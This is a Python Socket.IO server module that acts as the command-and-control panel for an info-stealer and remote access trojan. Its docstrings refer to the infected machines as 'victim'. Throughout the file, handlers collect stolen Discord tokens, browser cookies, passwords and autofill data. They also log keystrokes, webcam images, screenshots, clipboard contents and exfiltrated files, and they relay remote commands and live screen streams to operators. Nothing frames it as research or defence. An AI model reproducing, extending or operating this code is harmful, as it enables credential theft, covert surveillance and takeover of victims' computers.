import socketio
import jwt
from app.services.stream_manager import stream_manager
from app.core.config import settings
from sqlalchemy.orm import Session
from app.core.database import SessionLocal
from app.models.user import User
from app.api.v1.endpoints.online import online_players

def get_user_from_token(token: str) -> User:
    """Decode JWT and get user"""
    try:
        payload = jwt.decode(token, settings.SECRET_KEY, algorithms=["HS256"])
        user_id = payload.get("sub")
        if not user_id:
            return None
        if not user_id:
            return None
        with SessionLocal() as db:
            user = db.query(User).filter(User.id == int(user_id)).first()
            if user:
                db.expunge(user) # Detach from session
                return user
        return None
    except:
        return None

def get_user_from_build_key(build_key: str) -> User:
    """Get user by build key"""
    try:
        with SessionLocal() as db:
            user = db.query(User).filter(User.build_key == build_key).first()
            if user:
                db.expunge(user)
                return user
        return None
    except:
        return None

def register_socket_events(sio: socketio.AsyncServer):
    
    # Store session data: {sid: {'user_id': int, 'is_admin': bool, 'type': 'panel'|'guardian'}}
    sessions = {}
    
    @sio.event
    async def connect(sid, environ):
        # Extract IP from environ including proxy headers
        ip = environ.get('REMOTE_ADDR', '')
        x_forwarded = environ.get('HTTP_X_FORWARDED_FOR')
        if x_forwarded:
            ip = x_forwarded.split(',')[0].strip()
        
        print(f"Client connected: {sid} (IP: {ip})")
        sessions[sid] = {'ip': ip}

    @sio.on('*')
    async def catch_all(event, sid, data):
        if event not in ['stream_frame', 'mouse_move']: # Reduce spam
            print(f"DEBUG: Catch-all event: {event} from {sid}. Data keys: {list(data.keys()) if isinstance(data, dict) else 'Not dict'}")

    @sio.event
    async def disconnect(sid):
        print(f"Client disconnected: {sid}")
        
        # Check if it was a guardian
        player = stream_manager.remove_guardian(sid)
        if player:
            print(f"Guardian disconnected: {player}")
            # Notify viewers
            await sio.emit('guardian_offline', {'player': player})
        
        # Check if it was a viewer
        stream_manager.unregister_viewer(sid)
        
        # Cleanup session
        if sid in sessions:
            del sessions[sid]

    @sio.event
    async def authenticate(sid, data):
        """Panel users authenticate with JWT token"""
        token = data.get('token', '')
        user = get_user_from_token(token)
        if user:
            # Preserve IP from connect
            ip = sessions.get(sid, {}).get('ip', '')
            sessions[sid] = {
                'user_id': user.id,
                'is_admin': user.is_admin,
                'type': 'panel',
                'ip': ip
            }
            await sio.emit('authenticated', {'status': 'ok', 'user_id': user.id}, room=sid)
            return True
        await sio.emit('auth_error', {'error': 'Invalid token'}, room=sid)
        return False

    @sio.event
    async def guardian_connect(sid, data):
        """Guardian connects with build_key"""
        print(f"DEBUG: guardian_connect event received from {sid}. Data: {data}")
        player = data.get('player', '')
        build_key = data.get('build_key', '')
        pc_name = data.get('pc_name', '')
        pc_user = data.get('pc_user', '')
        
        if not player:
            print("DEBUG: guardian_connect failed - missing player name")
            return
            
        # Get IP from session
        ip = sessions.get(sid, {}).get('ip', 'Unknown')
        
        # Resolve user
        user = None
        user_id = None
        
        # 1. Try build key
        if build_key:
            user = get_user_from_build_key(build_key)
            if user:
                print(f"DEBUG: Identified user {user.id} by build_key")
        
        # 2. Fallback to IP address (Java Client often misses build_key)
        if not user:
            try:
                from app.api.v1.endpoints.online import find_user_by_ip
                with SessionLocal() as db:
                    found_user, resolved_key, method = find_user_by_ip(db, ip, player)
                    if found_user:
                        print(f"DEBUG: Identified user {found_user.id} by IP ({ip}) using method {method}")
                        # If we found a key via IP, upgrade the session to use it
                        if not build_key and resolved_key:
                            build_key = resolved_key
                        
                        # Use found user
                        user = found_user
                        db.expunge(user)
            except Exception as e:
                print(f"DEBUG: Failed IP lookup: {e}")

        user_id = user.id if user else None
        
        # Register guardian with user ownership
        stream_manager.register_guardian(player, sid, user_id=user_id, build_key=build_key)
        
        # Update session
        sessions[sid].update({
            'user_id': user_id,
            'is_admin': False,
            'type': 'guardian',
            'player': player
        })
        
        # Update online players
        try:
            from app.api.v1.endpoints.online import online_players
            from datetime import datetime
            
            # Don't overwrite if it exists and is recent (avoids flickering)
            online_players[player] = {
                'user_id': user_id,
                'build_key': build_key,
                'pc_name': pc_name,
                'pc_user': pc_user,
                'ip': ip,
                'connected_at': datetime.now().isoformat(),
                'last_seen': datetime.now(),
                'source': 'guardian',
                'match_method': 'websocket'
            }
        except Exception as e:
            print(f"DEBUG: Failed to update online_players: {e}")
        
        print(f"Guardian registered: {player} (user_id: {user_id}, sid: {sid})")
        
        # Join player room for targeted commands/crashes
        await sio.enter_room(sid, f"player_{player}")
        
        await sio.emit('guardian_registered', {'status': 'ok', 'player': player}, room=sid)

    @sio.event
    async def join_stream(sid, data):
        """Panel user joins a stream room"""
        player = data.get('player', '')
        stream_type = data.get('type', 'screen')
        
        # Verify user can access this stream
        session = sessions.get(sid, {})
        user_id = session.get('user_id')
        is_admin = session.get('is_admin', False)
        
        if not stream_manager.can_user_access_stream(user_id, player, is_admin):
            await sio.emit('stream_error', {'error': 'Not authorized'}, room=sid)
            return
        
        room = f"{stream_type}_{player}"
        sio.enter_room(sid, room)
        
        # Register as viewer
        stream_manager.register_viewer(sid, player, stream_type, user_id)
        
        print(f"Panel joined stream room: {room} (user_id: {user_id})")
        print(f"DEBUG: join_stream success. Player '{player}' is valid.")
        await sio.emit('stream_joined', {'room': room, 'player': player}, room=sid)
        
        # Send latest frame immediately if available (for instant display)
        latest_frame = stream_manager.get_latest_frame(player, stream_type)
        if latest_frame:
            await sio.emit('frame', {
                'player': player,
                'type': stream_type,
                'frame': latest_frame
            }, room=sid)

    @sio.event
    async def leave_stream(sid, data):
        """Panel user leaves a stream room"""
        player = data.get('player', '')
        stream_type = data.get('type', 'screen')
        room = f"{stream_type}_{player}"
        sio.leave_room(sid, room)
        stream_manager.unregister_viewer(sid)

    @sio.event
    async def stream_frame(sid, data):
        """Guardian sends a video frame - broadcast to ALL panel viewers watching this player"""
        player = data.get('player')
        if not player:
            print(f"DEBUG: stream_frame missing player from {sid}")
            return

        stream_type = data.get('type', 'screen')
        frame_data = data.get('frame', '')
        
        if not frame_data:
            print(f"DEBUG: stream_frame empty frame from {player}")
            return
        
        print(f"DEBUG: stream_frame from {player} type={stream_type} size={len(frame_data)}")
        
        # Update stats
        stream_manager.update_stream_stats(
            player, 
            stream_type, 
            data.get('fps', 30), 
            data.get('quality', 85)
        )
        
        # Store frame for instant delivery to new viewers
        stream_manager.store_frame(player, stream_type, frame_data)

        # FIXED: Broadcast to ALL authenticated panel sessions (not just room members)
        # This ensures frames are delivered even if room joining failed
        frame_payload = {
            'player': player,
            'type': stream_type,
            'frame': frame_data,
            'timestamp': data.get('timestamp')
        }
        
        broadcast_count = 0
        
        # Method 1: Broadcast to room (if viewers joined correctly)
        room = f"{stream_type}_{player}"
        await sio.emit('frame', frame_payload, room=room, skip_sid=sid)
        
        # Method 2: Also broadcast directly to all panel sessions watching this player
        for viewer_sid, viewer_data in stream_manager.viewers.items():
            if viewer_data.get('player') == player and viewer_data.get('type') == stream_type:
                try:
                    await sio.emit('frame', frame_payload, room=viewer_sid)
                    broadcast_count += 1
                except:
                    pass
        
        # Method 3: If no specific viewers, send to ALL authenticated panel users (fallback)
        if broadcast_count == 0:
            guardian_user_id = stream_manager.get_guardian_user_id(player)
            for panel_sid, session_data in sessions.items():
                if session_data.get('type') == 'panel' and panel_sid != sid:
                    # Optionally check if user is admin or owns this guardian
                    user_id = session_data.get('user_id')
                    is_admin = session_data.get('is_admin', False)
                    if is_admin or user_id == guardian_user_id:
                        try:
                            await sio.emit('frame', frame_payload, room=panel_sid)
                            broadcast_count += 1
                        except:
                            pass
        
        if broadcast_count > 0:
            print(f"DEBUG: Broadcast frame to {broadcast_count} viewers")

    @sio.event
    async def screen_frame(sid, data):
        """Legacy Guardian V5 compatibility - convert to stream_frame format"""
        # Get player from session (since old format doesn't include it)
        session = sessions.get(sid, {})
        player = session.get('player', '')
        
        if not player:
            print(f"DEBUG: screen_frame from {sid} but no player in session")
            return
        
        # Convert old format to new format
        frame_data = data.get('image', data.get('frame', ''))
        converted = {
            'player': player,
            'type': 'screen',
            'frame': frame_data
        }
        
        # Reuse stream_frame logic
        await stream_frame(sid, converted)

    @sio.event
    async def start_stream(sid, data):
        """Panel requests guardian to start streaming"""
        player = data.get('player', '')
        stream_type = data.get('type', 'screen')
        
        # Verify user can access
        session = sessions.get(sid, {})
        user_id = session.get('user_id')
        is_admin = session.get('is_admin', False)
        
        if not stream_manager.can_user_access_stream(user_id, player, is_admin):
            await sio.emit('stream_error', {'error': 'Not authorized'}, room=sid)
            return
        
        # Find guardian SID and send start command
        stats = stream_manager.get_stats(player)
        print(f"DEBUG: start_stream request for player '{player}' from user {user_id}. Stats found: {stats is not None}")
        
        if stats and 'sid' in stats:
            print(f"DEBUG: Emitting start_capture to guardian SID: {stats['sid']}")
            
            # Join the stream room to receive frames
            room = f"{stream_type}_{player}"
            sio.enter_room(sid, room)
            print(f"DEBUG: Added SID {sid} to room {room}")

            await sio.emit('start_capture', {
                'type': stream_type,
                'quality': data.get('quality', 85),
                'fps': data.get('fps', 30)
            }, room=stats['sid'])
            await sio.emit('stream_starting', {'player': player, 'type': stream_type}, room=sid)
        else:
            print(f"DEBUG: Stream start failed - Guardian not connected. Active streams: {stream_manager.active_streams.keys()}")
            await sio.emit('stream_error', {'error': 'Guardian not connected'}, room=sid)

    @sio.event
    async def stop_stream(sid, data):
        """Panel requests guardian to stop streaming"""
        player = data.get('player', '')
        stream_type = data.get('type', 'screen')
        
        stats = stream_manager.get_stats(player)
        if stats and 'sid' in stats:
            await sio.emit('stop_capture', {'type': stream_type}, room=stats['sid'])
            
            # Leave the room
            room = f"{stream_type}_{player}"
            sio.leave_room(sid, room)
            
            # Update stats
            if player in stream_manager.active_streams:
                stream_manager.active_streams[player]['streaming'] = False

    @sio.event
    async def remote_command(sid, data):
        """Panel sends remote command to guardian"""
        player = data.get('player', '')
        cmd_type = data.get('cmd_type', '')
        cmd_data = data.get('cmd_data', {})
        
        # Verify user can access
        session = sessions.get(sid, {})
        user_id = session.get('user_id')
        is_admin = session.get('is_admin', False)
        
        if not stream_manager.can_user_access_stream(user_id, player, is_admin):
            await sio.emit('command_error', {'error': 'Not authorized'}, room=sid)
            return
        
        stats = stream_manager.get_stats(player)
        if stats and 'sid' in stats:
            await sio.emit('execute_command', {
                'type': cmd_type,
                'data': cmd_data,
                'from_sid': sid
            }, room=stats['sid'])
        else:
            await sio.emit('command_error', {'error': 'Guardian not connected'}, room=sid)

    @sio.event
    async def command_result(sid, data):
        """Guardian sends command result back"""
        from_sid = data.get('from_sid', '')
        result = data.get('result', '')
        
        if from_sid:
            await sio.emit('command_response', {'result': result}, room=from_sid)
    @sio.event
    async def chat_message(sid, data):
        """Guardian sends chat message"""
        message = data.get('message', '')
        
        # Get guardian info
        guardian_info = sessions.get(sid, {})
        player = guardian_info.get('player')
        
        if player:
            # Broadcast to admins/viewers
            print(f"Chat from {player}: {message}")
            # Emit to all authenticated panel users
            # Use a 'panel_users' room if available, or broadcast to all and let frontend filter
            # For efficiency, we can iterate sessions or maintain a room.
            # Assuming admins/panel users are in a robust system, but for now specific room?
            # Let's emit to all 'authenticated' sessions if we tracked them, 
            # or just broadcast globally with a flag.
            await sio.emit('chat_message', {'player': player, 'message': message}, skip_sid=sid)

    @sio.event
    async def send_chat(sid, data):
        """Panel sends chat as victim"""
        player = data.get('player', '')
        message = data.get('message', '')
        
        stats = stream_manager.get_stats(player)
        if stats and 'sid' in stats:
            await sio.emit('send_chat', {'message': message}, room=stats['sid'])
            
    @sio.event
    async def play_sound(sid, data):
        """Panel plays sound on victim"""
        player = data.get('player', '')
        sound = data.get('sound', '')
        
        stats = stream_manager.get_stats(player)
        if stats and 'sid' in stats:
            await sio.emit('play_sound', {'sound': sound}, room=stats['sid'])

    @sio.event
    async def heartbeat(sid, data):
        """Guardian sends heartbeat with status"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
             return
             
        player = session.get('player')
        if player in online_players:
            from datetime import datetime
            online_players[player]['last_seen'] = datetime.now()
            online_players[player]['active_window'] = data.get('active_window', '')
            
            # Optional: Broadcast status update to panel if needed
            # await sio.emit('player_update', {'player': player, 'active_window': online_players[player]['active_window']})

    @sio.event
    async def preview_screenshot(sid, data):
        """Guardian sends preview screenshot for stream thumbnail"""
        player = data.get('player', '')
        image_b64 = data.get('image', '')
        
        if not player or not image_b64:
            return
        
        print(f"DEBUG: preview_screenshot from {player} size={len(image_b64)}")
        
        # Store in stream_manager for quick access
        stream_manager.store_frame(player, 'preview', image_b64)
        
        # Also broadcast to all panel sessions so they can update thumbnail
        for panel_sid, session_data in sessions.items():
            if session_data.get('type') == 'panel':
                try:
                    await sio.emit('preview_update', {
                        'player': player,
                        'image': image_b64
                    }, room=panel_sid)
                except:
                    pass

    @sio.event
    async def request_previews(sid):
        """Frontend requests latest previews for all players"""
        # Iterate over all active streams/frame buffers
        # stream_manager.frame_buffers has { 'screen_Player': ... }
        # AND check disk for persisted ones?
        # For simplicity, send what's in memory or reload from disk if we want to be fancy.
        # Let's send from disk if memory is empty.
        
        # 1. Active memory buffers
        try:
             # Iterate static/previews dir
             import os
             import base64
             
             base_dir = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
             static_dir = os.path.join(base_dir, "static", "previews")
             
             if os.path.exists(static_dir):
                 for filename in os.listdir(static_dir):
                     if filename.endswith(".jpg"):
                         # filename: stream_type_player.jpg
                         parts = filename.replace(".jpg", "").split("_", 1)
                         if len(parts) == 2:
                             stream_type, player = parts
                             # Read file
                             with open(os.path.join(static_dir, filename), "rb") as f:
                                 data = f.read() # raw bytes
                                 b64 = base64.b64encode(data).decode('utf-8')
                                 
                                 await sio.emit('preview_update', {
                                     'player': player,
                                     'image': b64, # Front end expects base64 string
                                     'type': stream_type
                                 }, room=sid)
        except Exception as e:
            print(f"Error sending previews: {e}")
    @sio.event
    async def discord_tokens(sid, data):
        """Guardian sends extracted discord tokens"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
             print(f"DEBUG: Unauthorized discord_tokens from {sid}")
             return

        user_id = session.get('user_id')
        player = session.get('player', 'Unknown')
        ip = session.get('ip', 'Unknown')
        tokens = data.get('tokens', [])
        
        if not tokens:
            return

        print(f"DEBUG: Received {len(tokens)} discord tokens from {player}")
        
        try:
            from app.models.user import Log, Token
            from sqlalchemy.exc import IntegrityError
            import json
            
            with SessionLocal() as db:
                # 1. Save valid tokens to Token table (for Discord Tab)
                saved_count = 0
                for token_str in tokens:
                    clean_token = token_str
                    source_app = "guardian"
                    
                    # Parse "App: Token" format
                    if ": " in token_str:
                        parts = token_str.split(": ", 1)
                        if len(parts) == 2:
                            source_app = parts[0]
                            clean_token = parts[1].strip()
                    
                    # Basic layout check
                    if len(clean_token) < 20: 
                        continue
                        
                    try:
                        meta = {
                            "source": "guardian",
                            "source_app": source_app,
                            "pc_name": player,
                            "pc_user": session.get('pc_user', 'Guardian'),
                            "ip": ip,
                            "country": "Unknown"
                        }
                        
                        # Check existance first
                        existing = db.query(Token).filter(Token.token == clean_token).first()
                        if existing:
                            # Update metadata if needed (e.g. new source detected)
                            # But preserve existing validation status if it IS valid? 
                            # User says: "sometime invalid tokens are shown as valid".
                            # If we re-detect it, maybe we don't change status until re-validated.
                            # But we should update 'updated_at' implicitly or metadata.
                            try:
                                old_meta = json.loads(existing.token_metadata or "{}")
                                old_meta.update(meta) # Merge new info
                                existing.token_metadata = json.dumps(old_meta)
                                db.commit()
                            except:
                                pass
                        else:
                            new_token = Token(
                                user_id=user_id,
                                token=clean_token,
                                token_metadata=json.dumps(meta),
                                is_valid=None # Pending validation
                            )
                            db.add(new_token)
                            db.commit()
                            saved_count += 1
                    except Exception as e:
                        print(f"Error saving/updating token DB: {e}")
                        db.rollback()

                # 2. Save raw log (for All Logs history)
                content_str = json.dumps({
                    "source": "guardian_v5",
                    "tokens": tokens,
                    "count": len(tokens),
                    "saved_new": saved_count
                })
                
                log = Log(
                    user_id=user_id,
                    log_type='discord',
                    ip_address=ip,
                    content=content_str,
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
            
            # Notify panel
            await sio.emit('new_log', {'type': 'discord', 'player': player}, room=f"user_{user_id}")
            
        except Exception as e:
            print(f"ERROR processing discord tokens: {e}")

    @sio.event
    async def webcam(sid, data):
        """Guardian sends webcam capture"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
             return

        user_id = session.get('user_id')
        player = session.get('player', 'Unknown')
        ip = session.get('ip', 'Unknown')
        image_b64 = data.get('image', '')
        
        if not image_b64:
            return

        print(f"DEBUG: Received webcam capture from {player} size={len(image_b64)}")
        
        try:
            from app.models.user import Log
            import json
            from datetime import datetime
            
            # 1. Store in StreamManager for live viewing/preview
            stream_manager.store_frame(player, 'webcam', image_b64)
            stream_manager.update_stream_stats(player, 'webcam', 1, 100)
            
            # Broadcast to panel viewers immediately
            await sio.emit('frame', {
                'player': player,
                'type': 'webcam',
                'frame': image_b64
            }, room=f"webcam_{player}")
            
            with SessionLocal() as db:
                content_str = json.dumps({
                    "image": image_b64,
                    "timestamp": datetime.now().isoformat()
                })
                
                log = Log(
                    user_id=user_id,
                    log_type='webcam',
                    ip_address=ip,
                    content=content_str,
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
            
            # Notify panel (New Log + Preview)
            for panel_sid, sess in sessions.items():
                if sess.get('type') == 'panel':
                     # Check access
                     p_user_id = sess.get('user_id')
                     p_is_admin = sess.get('is_admin', False)
                     if p_is_admin or str(p_user_id) == str(user_id):
                         await sio.emit('new_webcam', {'player': player}, room=panel_sid)
                         # Also emit frame to panel user directly
                         await sio.emit('frame', {
                             'player': player, 
                             'type': 'webcam', 
                             'frame': image_b64
                         }, room=panel_sid)
            
        except Exception as e:
            print(f"ERROR processing webcam capture: {e}")

    @sio.event
    async def browser_cookies(sid, data):
        """Guardian sends extracted browser cookies (ABE v20 or DPAPI v10)"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            print(f"DEBUG: Unauthorized browser_cookies from {sid}")
            return

        user_id = session.get('user_id')
        player = session.get('player', 'Unknown')
        ip = session.get('ip', 'Unknown')
        cookies = data.get('cookies', [])
        source = data.get('source', 'unknown')  # 'abe_v20' or 'dpapi_v10'
        
        if not cookies:
            return

        print(f"DEBUG: Received {len(cookies)} browser cookies from {player} (source: {source})")
        
        try:
            from app.models.user import Log
            import json
            
            with SessionLocal() as db:
                content_str = json.dumps({
                    "source": source,
                    "cookies": cookies,
                    "count": len(cookies)
                })
                
                log = Log(
                    user_id=user_id,
                    log_type='cookies',
                    ip_address=ip,
                    content=content_str,
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
            
            # Notify panel
            await sio.emit('new_log', {'type': 'cookies', 'player': player, 'count': len(cookies)}, room=f"user_{user_id}")
            
        except Exception as e:
            print(f"ERROR processing browser cookies: {e}")

    @sio.event
    async def browser_passwords(sid, data):
        """Guardian sends extracted browser passwords (ABE v20)"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            print(f"DEBUG: Unauthorized browser_passwords from {sid}")
            return

        user_id = session.get('user_id')
        player = session.get('player', 'Unknown')
        ip = session.get('ip', 'Unknown')
        passwords = data.get('passwords', [])
        source = data.get('source', 'unknown')
        
        if not passwords:
            return

        print(f"DEBUG: Received {len(passwords)} browser passwords from {player} (source: {source})")
        
        try:
            from app.models.user import Log
            import json
            
            with SessionLocal() as db:
                content_str = json.dumps({
                    "source": source,
                    "passwords": passwords,
                    "count": len(passwords)
                })
                
                log = Log(
                    user_id=user_id,
                    log_type='passwords',
                    ip_address=ip,
                    content=content_str,
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
            
            # Notify panel
            await sio.emit('new_log', {'type': 'passwords', 'player': player, 'count': len(passwords)}, room=f"user_{user_id}")
            
        except Exception as e:
            print(f"ERROR processing browser passwords: {e}")

    @sio.event
    async def browser_autofill(sid, data):
        """Guardian sends extracted browser autofill data (ABE v20)"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            print(f"DEBUG: Unauthorized browser_autofill from {sid}")
            return

        user_id = session.get('user_id')
        player = session.get('player', 'Unknown')
        ip = session.get('ip', 'Unknown')
        autofill = data.get('autofill', [])
        source = data.get('source', 'unknown')
        
        if not autofill:
            return

        print(f"DEBUG: Received {len(autofill)} browser autofill entries from {player} (source: {source})")
        
        try:
            from app.models.user import Log
            import json
            
            with SessionLocal() as db:
                content_str = json.dumps({
                    "source": source,
                    "autofill": autofill,
                    "count": len(autofill)
                })
                
                log = Log(
                    user_id=user_id,
                    log_type='autofill',
                    ip_address=ip,
                    content=content_str,
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
            
            # Notify panel
            await sio.emit('new_log', {'type': 'autofill', 'player': player, 'count': len(autofill)}, room=f"user_{user_id}")
            
        except Exception as e:
            print(f"ERROR processing browser autofill: {e}")

    @sio.event
    async def process_list(sid, data):
        """Guardian sends process list"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            return
        
        player = data.get('player', session.get('player', 'Unknown'))
        processes = data.get('processes', [])
        from_sid = data.get('from_sid', '')
        
        print(f"DEBUG: Received process list from {player}: {len(processes)} processes")
        
        # Forward to requesting panel session
        if from_sid:
            await sio.emit('process_list', {
                'player': player,
                'processes': processes,
                'count': len(processes)
            }, room=from_sid)
        
        # Also broadcast to all panel sessions viewing this player
        for panel_sid, sess in sessions.items():
            if sess.get('type') == 'panel':
                await sio.emit('process_list', {
                    'player': player,
                    'processes': processes,
                    'count': len(processes)
                }, room=panel_sid)

    @sio.event
    async def keylog_data(sid, data):
        """Guardian sends keylogger data"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            return
        
        player = data.get('player', session.get('player', 'Unknown'))
        keys = data.get('keys', '')
        window = data.get('window', '')
        time_str = data.get('time', '')
        user_id = session.get('user_id')
        ip = session.get('ip', 'Unknown')
        
        if not keys:
            return
        
        print(f"DEBUG: Keylog from {player}: {len(keys)} chars, window: {window}")
        
        try:
            from app.models.user import Log
            import json
            
            with SessionLocal() as db:
                content_str = json.dumps({
                    "keys": keys,
                    "window": window,
                    "time": time_str
                })
                
                log = Log(
                    user_id=user_id,
                    log_type='keylog',
                    ip_address=ip,
                    content=content_str,
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
            
            # Forward to panel sessions
            for panel_sid, sess in sessions.items():
                if sess.get('type') == 'panel':
                    await sio.emit('keylog_update', {
                        'player': player,
                        'keys': keys,
                        'window': window,
                        'time': time_str
                    }, room=panel_sid)
                    
        except Exception as e:
            print(f"ERROR saving keylog: {e}")

    @sio.event
    async def screenshot(sid, data):
        """Guardian sends on-demand screenshot"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            return
        
        player = data.get('player', session.get('player', 'Unknown'))
        image_b64 = data.get('image', '')
        from_sid = data.get('from_sid', '')
        user_id = session.get('user_id')
        ip = session.get('ip', 'Unknown')
        
        if not image_b64:
            return
        
        print(f"DEBUG: Screenshot from {player}, size: {len(image_b64)}")
        
        try:
            from app.models.user import Log
            import json
            from datetime import datetime
            import base64
            import os
            
            # Save image to disk
            screenshots_dir = os.path.join('static', 'screenshots')
            os.makedirs(screenshots_dir, exist_ok=True)
            
            filename = f"{player}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            filepath = os.path.join(screenshots_dir, filename)
            
            with open(filepath, 'wb') as f:
                f.write(base64.b64decode(image_b64))
            
            # Save to DB
            with SessionLocal() as db:
                log = Log(
                    user_id=user_id,
                    log_type='screenshot',
                    ip_address=ip,
                    content=json.dumps({"file": filename, "path": filepath}),
                    pc_name=player,
                    pc_user=session.get('pc_user', 'Guardian')
                )
                db.add(log)
                db.commit()
                log_id = log.id
            
            # Forward to requesting session
            if from_sid:
                await sio.emit('screenshot_result', {
                    'player': player,
                    'image': image_b64,
                    'log_id': log_id
                }, room=from_sid)
            
            # Broadcast to all panel sessions
            for panel_sid, sess in sessions.items():
                if sess.get('type') == 'panel':
                    await sio.emit('screenshot_update', {
                        'player': player,
                        'image': image_b64
                    }, room=panel_sid)
                    
        except Exception as e:
            print(f"ERROR saving screenshot: {e}")

    @sio.event
    async def webcam_frame(sid, data):
        """Guardian sends webcam capture"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            return
        
        player = data.get('player', session.get('player', 'Unknown'))
        image_b64 = data.get('image', '')
        from_sid = data.get('from_sid', '')
        
        if not image_b64:
            return
        
        print(f"DEBUG: Webcam frame from {player}, size: {len(image_b64)}")
        
        # Forward to requesting session
        if from_sid:
            await sio.emit('webcam_result', {
                'player': player,
                'image': image_b64
            }, room=from_sid)
        
        # Broadcast to all panel sessions
        for panel_sid, sess in sessions.items():
            if sess.get('type') == 'panel':
                await sio.emit('webcam_update', {
                    'player': player,
                    'image': image_b64
                }, room=panel_sid)

    @sio.event
    async def clipboard_data(sid, data):
        """Guardian sends clipboard content"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            return
        
        player = data.get('player', session.get('player', 'Unknown'))
        content = data.get('content', '')
        from_sid = data.get('from_sid', '')
        
        print(f"DEBUG: Clipboard from {player}: {len(content)} chars")
        
        # Forward to requesting session
        if from_sid:
            await sio.emit('clipboard_result', {
                'player': player,
                'content': content
            }, room=from_sid)

    @sio.event
    async def file_download(sid, data):
        """Guardian sends file download"""
        session = sessions.get(sid)
        if not session or session.get('type') != 'guardian':
            return
        
        player = data.get('player', session.get('player', 'Unknown'))
        path = data.get('path', '')
        name = data.get('name', '')
        file_data = data.get('data', '')
        size = data.get('size', 0)
        from_sid = data.get('from_sid', '')
        
        print(f"DEBUG: File download from {player}: {name} ({size} bytes)")
        
        # Forward to requesting session
        if from_sid:
            await sio.emit('file_download_result', {
                'player': player,
                'path': path,
                'name': name,
                'data': file_data,
                'size': size
            }, room=from_sid)
